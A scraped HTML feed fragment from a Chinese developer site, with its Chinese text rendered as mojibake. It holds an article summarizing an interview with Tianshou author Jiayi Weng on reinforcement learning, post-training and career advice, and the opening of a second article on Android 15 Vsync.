                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df95116754c4cfc950748d2e8e7b851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=Q%2FgR5Fh5rTPUW0RfSXD7UXWNwHI%3D" alt="image1.png" loading="lazy"/></p>
<p><em>æ¨¡å‹å¼€å‘ä¸‰é˜¶æ®µï¼šé¢„è®­ç»ƒâ€”åè®­ç»ƒâ€”RLHFï¼ˆç¤ºæ„ï¼‰</em></p>
<p>ä½œä¸º Tianshouï¼ˆå¤©æˆï¼‰å¼ºåŒ–å­¦ä¹ æ¡†æ¶çš„ä½œè€…å’Œ OpenAI GPT-4 åè®­ç»ƒï¼ˆPost-trainingï¼‰å›¢é˜Ÿçš„æ ¸å¿ƒæˆå‘˜ï¼Œç¿å®¶ç¿Œï¼ˆJiayi Wengï¼‰çš„æˆé•¿è·¯å¾„æœ¬èº«å°±æ˜¯ä¸€éƒ¨å…³äºâ€œå¦‚ä½•æ„å»ºå½±å“åŠ›â€çš„æ¡ˆä¾‹ã€‚åœ¨ WhynotTV çš„è¿™æœŸè®¿è°ˆä¸­ï¼Œä»–åˆ†äº«äº†ä»æ¸…åã€CMU åˆ° OpenAI çš„æŠ€æœ¯è¿›é˜¶ï¼Œå¹¶æ‹†è§£äº†å¼ºåŒ–å­¦ä¹ ã€å·¥ä¸šçº§åŸºç¡€è®¾æ–½ï¼ˆInfraï¼‰ä»¥åŠå¼€æºç¤¾åŒºèƒŒåçš„é€»è¾‘ã€‚è¿™æ—¢æ˜¯å¯¹å‰æ²¿æŠ€æœ¯çš„è§‚å¯Ÿï¼Œä¹Ÿæ˜¯ä¸€ä»½åœ¨ä¸ç¡®å®šæ€§ä¸­æŠ•èµ„æœªæ¥çš„è¡ŒåŠ¨å‚è€ƒã€‚</p>
<h3 data-id="heading-1">æ—©æœŸç»å†ï¼šæŠ•èµ„æœªæ¥ä¸æ‰“ç ´ä¿¡æ¯å·®</h3>
<p>ç¿å®¶ç¿Œçš„â€œé•¿æœŸä¸»ä¹‰â€åœ¨ç«¥å¹´æ—¶æœŸä¾¿å·²æ˜¾ç°ã€‚æ—©æœŸæ¥è§¦è®¡ç®—æœºæ—¶ï¼Œä»–æ›´å…³æ³¨èƒ½åœ¨æœªæ¥åå¤ä½¿ç”¨çš„èƒ½åŠ›æ„å»ºï¼›åœ¨é«˜ä¸­ä¿¡æ¯å­¦ç«èµ›é˜¶æ®µï¼Œä»–æ•é”ä½“ä¼šåˆ°â€œä¿¡æ¯å·®â€çš„å½±å“ï¼Œç†è§£é«˜è´¨é‡è®­ç»ƒèµ„æºçš„é‡è¦æ€§ã€‚</p>
<p>åœ¨æ¸…åå°±è¯»æœŸé—´ï¼Œä»–é€‰æ‹©ä»¥å¼€æºçš„æ–¹å¼é™ä½ä¿¡æ¯å£å’ï¼šå°†ä½œä¸šã€ç¬”è®°ä¸æ•´ç†åçš„èµ„æ–™å‘å¸ƒåˆ° GitHubã€‚æœ€åˆçš„åŠ¨æœºæ˜¯åˆ†äº«ï¼Œä½†éšæ—¶é—´ç§¯ç´¯ä¸ºä¸ªäººä¿¡èª‰ä¸ç¤¾åŒºå½±å“åŠ›ã€‚å¼€æºä¸ä»…æ˜¯ä»£ç å…±äº«ï¼Œæ›´æ˜¯æ€æƒ³ä¸æ–¹æ³•çš„â€œè”ç½‘â€ã€‚</p>
<h3 data-id="heading-2">å¼€æºå“²å­¦ï¼šæŠŠå·¥å…·å½“ä½œä¸€ç§â€œæ…ˆå–„â€</h3>
<p>ä»æ—©æœŸèµ„æ–™åˆ†äº«åˆ°æ‰“é€  Tianshouï¼ˆå¤©æˆï¼‰æ¡†æ¶ï¼Œç¿å®¶ç¿Œå°†â€œå½±å“åŠ›â€è½åœ¨å¯è¢«åå¤ä½¿ç”¨çš„å·¥å…·ä¸Šï¼š</p>
<ul>
<li>Tianshou ä½œä¸ºå¼ºåŒ–å­¦ä¹ åº“ï¼Œè¡¥è¶³äº†å½“æ—¶ PyTorch ç”Ÿæ€åœ¨ RL æ–¹é¢çš„ç©ºç™½ï¼Œä»¥å·¥ç¨‹åŒ–å“è´¨æœåŠ¡ç ”ç©¶ä¸å®è·µã€‚</li>
<li>tuixue online ä½œä¸ºç­¾è¯æŸ¥è¯¢å·¥å…·ï¼Œä»å®é™…é—®é¢˜å‡ºå‘é™ä½æ±‚è§£æˆæœ¬ã€‚</li>
</ul>
<p>å…¶æ ¸å¿ƒä»·å€¼è§‚æ˜¯è¿½æ±‚ Impactï¼ˆå½±å“åŠ›ï¼‰ï¼šå·¥ä½œæ˜¯å¦åˆ‡å®è§£å†³é—®é¢˜ã€èŠ‚çº¦ç¤¾ä¼šæ€»æˆæœ¬ã€‚æŠŠå†™ä»£ç ã€åšå·¥å…·å½“ä½œâ€œå…¬å…±åŸºç¡€è®¾æ–½â€çš„å»ºè®¾ï¼Œæ„æˆäº†é•¿æœŸçš„ä¸ªäººæŠ¤åŸæ²³ã€‚</p>
<h3 data-id="heading-3">å¼ºåŒ–å­¦ä¹ ä¸åè®­ç»ƒï¼šå®šä¹‰ä¸æŒ‘æˆ˜</h3>
<p>åœ¨å¤§æ¨¡å‹å·¥ä¸šåŒ–åœºæ™¯ä¸­ï¼Œåè®­ç»ƒï¼ˆPost-trainingï¼‰æ˜¯æ‰¿æ¥é¢„è®­ç»ƒèƒ½åŠ›å¹¶å¯¹é½äººç±»åå¥½çš„å…³é”®é˜¶æ®µã€‚</p>
<p><strong>å…³é”®æœ¯è¯­è§£æ</strong></p>
<ul>
<li><strong>é¢„è®­ç»ƒï¼ˆPre-trainingï¼‰</strong>ï¼šè®©æ¨¡å‹ä¹ å¾—æµ·é‡ä¸–ç•ŒçŸ¥è¯†ï¼Œè§£å†³â€œæ‡‚ä¸æ‡‚â€ã€‚</li>
<li><strong>åè®­ç»ƒï¼ˆPost-trainingï¼‰</strong>ï¼šæ¿€å‘æ¨¡å‹èƒ½åŠ›å¹¶å¯¹é½äººç±»ä»·å€¼è§‚ï¼Œè§£å†³â€œå¥½ä¸å¥½ç”¨â€ã€‚</li>
<li><strong>RLHFï¼ˆReinforcement Learning from Human Feedbackï¼‰</strong>ï¼šä»¥äººç±»åé¦ˆä¸ºä¿¡å·ï¼Œé€šè¿‡å¼ºåŒ–å­¦ä¹ ä¼˜åŒ–æ¨¡å‹è¡Œä¸ºã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œå°†è¿™äº›æ–¹æ³•ä»å®éªŒå®¤æ¨å‘å·¥ä¸šçº§ï¼Œè¿˜é¢ä¸´ä¸‰ç±»æ ¸å¿ƒæŒ‘æˆ˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc866b8f9cc44511a5c9194e5339d35c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=CTQWuOdByDjCyjuE5Wvkv2CGfp0%3D" alt="image2.png" loading="lazy"/></p>
<p><em>å·¥ä¸šçº§åè®­ç»ƒçš„ä¸‰ç±»æŒ‘æˆ˜ï¼ˆç¤ºæ„ï¼‰ï¼šæ•°æ®ä¸åå¥½å»ºæ¨¡ã€ç®—æ³•ç¨³å®šæ€§ã€è§„æ¨¡åŒ–åŸºç¡€è®¾æ–½</em></p>
<ol>
<li><strong>æ•°æ®ä¸åå¥½å»ºæ¨¡çš„å¤æ‚æ€§</strong>ï¼šäººç±»åå¥½æ¨¡ç³Šä¸”éš¾é‡åŒ–ï¼Œæ„å»ºé«˜è´¨é‡å¥–åŠ±æ¨¡å‹ï¼ˆReward Modelï¼‰æ˜¯é¦–è¦éš¾é¢˜ã€‚</li>
<li><strong>ç®—æ³•çš„ç¨³å®šæ€§</strong>ï¼šå¼ºåŒ–å­¦ä¹ å¯¹è¶…å‚æ•°æ•æ„Ÿï¼Œæ˜“å‡ºç°ä¸æ”¶æ•›æˆ–æ€§èƒ½éœ‡è¡ï¼›åœ¨è¶…å¤§è§„æ¨¡è®­ç»ƒä¸­é—®é¢˜è¢«æ”¾å¤§ã€‚</li>
<li><strong>è§„æ¨¡åŒ–åŸºç¡€è®¾æ–½ï¼ˆInfraï¼‰</strong>ï¼šå½“å‚æ•°é‡ä¸å¹¶å‘è§„æ¨¡å¾ˆå¤§æ—¶ï¼ŒGPU ååŒã€åˆ†å¸ƒå¼é€šä¿¡ä¸å¯å¤ç°å®éªŒè¿­ä»£æˆä¸ºå†³å®šå› ç´ ã€‚</li>
</ol>
<h3 data-id="heading-4">ç»„ç»‡ä¸äº§å“ï¼šäººæ‰å¯†åº¦ä¸ç¡®å®šæ€§</h3>
<p>2022 å¹´åŠ å…¥ OpenAI çš„ç›´è§‚æ„Ÿå—æ˜¯äººæ‰å¯†åº¦é«˜ã€å±‚çº§æ‰å¹³ï¼Œä¸ªä½“èƒ½ç‹¬å½“ä¸€é¢ï¼Œæ²Ÿé€šæˆæœ¬ä½ã€‚å›é¡¾ ChatGPT çš„æˆåŠŸï¼Œå†…éƒ¨å¯¹ç¼©æ”¾å®šå¾‹ï¼ˆScaling Lawsï¼‰çš„ä¿¡å¿µä¸å¯¹å·¥ç¨‹æè‡´çš„è¿½æ±‚ï¼Œä½¿â€œè§„æ¨¡åŒ–è¿­ä»£ + é«˜å¯†åº¦å›¢é˜Ÿâ€æˆä¸ºèƒ½åŠ›æ¶Œç°çš„å¯é¢„è§å¼•æ“ã€‚</p>
<h3 data-id="heading-5">æœªæ¥è§‚å¯Ÿï¼šç“¶é¢ˆä¸æ–¹å‘</h3>
<p>æœªæ¥ 5â€“10 å¹´å€¼å¾—å…³æ³¨çš„æ–¹å‘ï¼š</p>
<ol>
<li><strong>æ¨ç†èƒ½åŠ›ï¼ˆReasoningï¼‰</strong>ï¼šçªç ´â€œæ¦‚ç‡é¢„æµ‹â€çš„å±€é™ï¼Œå‘æ›´æ·±å±‚çš„è§„åˆ’ä¸é€»è¾‘è¿ˆè¿›ã€‚</li>
<li><strong>ä¸–ç•Œæ¨¡å‹ï¼ˆWorld Modelsï¼‰</strong>ï¼šä»æ–‡æœ¬ç»Ÿè®¡èµ°å‘å¯¹ç‰©ç†ä¸–ç•Œæ›´çœŸå®çš„å»ºæ¨¡ï¼Œæ”¯æ’‘æœºå™¨äººä¸å®ä½“ç»æµã€‚</li>
<li><strong>æ•°æ®è´¨é‡ä¸äº¤äº’å¼å­¦ä¹ </strong>ï¼šåœ¨é«˜è´¨é‡æ–‡æœ¬è¶‹äºæ¯ç«­èƒŒæ™¯ä¸‹ï¼Œåˆ©ç”¨åˆæˆæ•°æ®ä¸ç¯å¢ƒäº¤äº’è·å–æ–°ä¿¡å·ã€‚</li>
<li><strong>æˆæœ¬ç»“æ„</strong>ï¼šé™ä½æ¨ç†æˆæœ¬ï¼Œè®©èƒ½åŠ›å¯è¢«å¹¿æ³›ã€å¯æŒç»­åœ°ä½¿ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-6">å¼€æ”¾ä¸æ²»ç†çš„ç°å®è€ƒé¢˜</h3>
<p>å…³äºâ€œæ˜¯å¦è¶³å¤Ÿå¼€æ”¾â€çš„è®¨è®ºï¼Œæœ¬è´¨æ˜¯å¼€æ”¾ç ”ç©¶ä¸å®‰å…¨/å•†ä¸šåŒ–ä¹‹é—´çš„å¼ åŠ›ã€‚ä¸ºäº†å®ç°å®å¤§ä½¿å‘½ï¼Œå¿…é¡»ä¾èµ–ç®—åŠ›ä¸èµ„é‡‘æŠ•å…¥ï¼Œå•†ä¸šåŒ–æ˜¯å®ç°è·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚äººäº‹ä¸æµåŠ¨åœ¨é«˜é€Ÿå‘å±•ä¸­éš¾ä»¥é¿å…ï¼Œå…³é”®åœ¨äºæŠ€æœ¯è·¯çº¿ä¸æ²»ç†å®è·µèƒ½å¦æŒç»­æ¨è¿›ã€‚</p>
<h3 data-id="heading-7">è·¯å¾„å»ºè®®ï¼šç»™èµ°åœ¨è·¯ä¸Šçš„äºº</h3>
<p>ç»“åˆä¸ªäººç»å†ï¼Œç»™æŠ€æœ¯ä»ä¸šè€…çš„å‡ ç‚¹å»ºè®®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d21536c20d646179af590753c5467b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=BDrZPCicUhQs%2Fs7BR37E12sdmPk%3D" alt="image3.png" loading="lazy"/></p>
<p><em>è¡ŒåŠ¨è·¯å¾„ï¼ˆç¤ºæ„ï¼‰ï¼šå·¥ç¨‹èƒ½åŠ›â€”å¼€æºæ æ†â€”é•¿æœŸä¸»ä¹‰</em></p>
<ul>
<li><strong>é‡è§†å·¥ç¨‹èƒ½åŠ›ï¼ˆEngineeringï¼‰</strong>ï¼šä¼˜ç§€ç®—æ³•ç¦»ä¸å¼€æ‰å®çš„å·¥ç¨‹ä¸åŸºç¡€è®¾æ–½èƒ½åŠ›ã€‚</li>
<li><strong>ç”¨å¼€æºå»ºç«‹æ æ†</strong>ï¼šé€šè¿‡é«˜è´¨é‡å¼€æºé¡¹ç›®æˆ–æŠ€æœ¯è¾“å‡ºç§¯ç´¯ä¿¡èª‰ä¸è¿æ¥ã€‚</li>
<li><strong>ä¿æŒé•¿æœŸä¸»ä¹‰</strong>ï¼šå›´ç»•æœ‰é•¿æœŸä»·å€¼çš„æ–¹å‘æ·±è€•ï¼Œä»¥ç³»ç»Ÿæ€§ç§¯ç´¯å¯¹æŠ—çŸ­æœŸç„¦è™‘ã€‚</li>
</ul>
<h3 data-id="heading-8">ç»“è¯­</h3>
<p>ä»æ¸…åå›­çš„å¼€æºå°‘å¹´åˆ°ç¡…è°·é£æš´ä¸­å¿ƒçš„ç ”ç©¶å®è·µè€…ï¼Œç¿å®¶ç¿Œçš„è·¯å¾„è¯´æ˜ï¼šæŒç»­åˆ†äº«ã€å·¥ç¨‹è½åœ°ä¸é•¿æœŸæŠ•å…¥ï¼Œèƒ½æ„æˆå¯æŒç»­çš„å½±å“åŠ›ï¼›ä¸å…¶è¿½é€é£å£ï¼Œä¸å¦‚æ‰“ç£¨å·¥å…·ã€è§£å†³çœŸæ­£é‡è¦çš„é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 15 æ˜¾ç¤ºå­ç³»ç»Ÿæ·±åº¦è§£æ(ä¸‰)ï¼šVsyncæœºåˆ¶ä¸æ˜¾ç¤ºæ€§èƒ½ä¼˜åŒ–å®æˆ˜]]></title>    <link>https://juejin.cn/post/7596906923892228106</link>    <guid>https://juejin.cn/post/7596906923892228106</guid>    <pubDate>2026-01-19T13:33:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892228106" data-draft-id="7596906473306292274" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 15 æ˜¾ç¤ºå­ç³»ç»Ÿæ·±åº¦è§£æ(ä¸‰)ï¼šVsyncæœºåˆ¶ä¸æ˜¾ç¤ºæ€§èƒ½ä¼˜åŒ–å®æˆ˜"/> <meta itemprop="keywords" content="Android,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-19T13:33:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 15 æ˜¾ç¤ºå­ç³»ç»Ÿæ·±åº¦è§£æ(ä¸‰)ï¼šVsyncæœºåˆ¶ä¸æ˜¾ç¤ºæ€§èƒ½ä¼˜åŒ–å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T13:33:06.000Z" title="Mon Jan 19 2026 13:33:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨å‰ä¸¤ç¯‡æ–‡ç« ä¸­,æˆ‘ä»¬æ·±å…¥åˆ†æäº†SurfaceFlingerçš„æ ¸å¿ƒæœºåˆ¶å’Œå›¾å½¢ç¼“å†²åŒºç®¡ç†ã€‚æœ¬æ–‡å°†ç»§ç»­æ¢è®¨Androidæ˜¾ç¤ºç³»ç»Ÿä¸­æœ€å…³é”®çš„åŒæ­¥æœºåˆ¶â€”â€”Vsync(å‚ç›´åŒæ­¥),ä»¥åŠå¦‚ä½•åŸºäºVsyncæ„å»ºæµç•…çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<p>Vsyncæ˜¯Androidæ˜¾ç¤ºç³»ç»Ÿçš„"å¿ƒè·³",å®ƒåƒä¸€ä¸ªç²¾å‡†çš„èŠ‚æ‹å™¨,åè°ƒç€åº”ç”¨ç»˜åˆ¶ã€ç³»ç»Ÿåˆæˆã€å±å¹•æ˜¾ç¤ºä¸‰ä¸ªç¯èŠ‚çš„å®Œç¾é…åˆã€‚ç†è§£Vsyncæœºåˆ¶,æ˜¯æŒæ¡Androidæ€§èƒ½ä¼˜åŒ–çš„å…³é”®ã€‚</p>
<p>æœ¬æ–‡å°†åŸºäº<strong>Android 15 (AOSP)å®é™…æºç </strong>,æ·±å…¥åˆ†æä»¥ä¸‹æ ¸å¿ƒå†…å®¹:</p>
<ul>
<li>Vsyncä¿¡å·çš„äº§ç”Ÿä¸åˆ†å‘æœºåˆ¶</li>
<li>Choreographerå¦‚ä½•åè°ƒåº”ç”¨ä¾§æ¸²æŸ“</li>
<li>ä¸‰é‡ç¼“å†²å¦‚ä½•å‡å°‘æ‰å¸§</li>
<li>ä½¿ç”¨Systrace/Perfettoè¯Šæ–­æ€§èƒ½é—®é¢˜çš„å®Œæ•´å®æˆ˜</li>
</ul>
<blockquote>
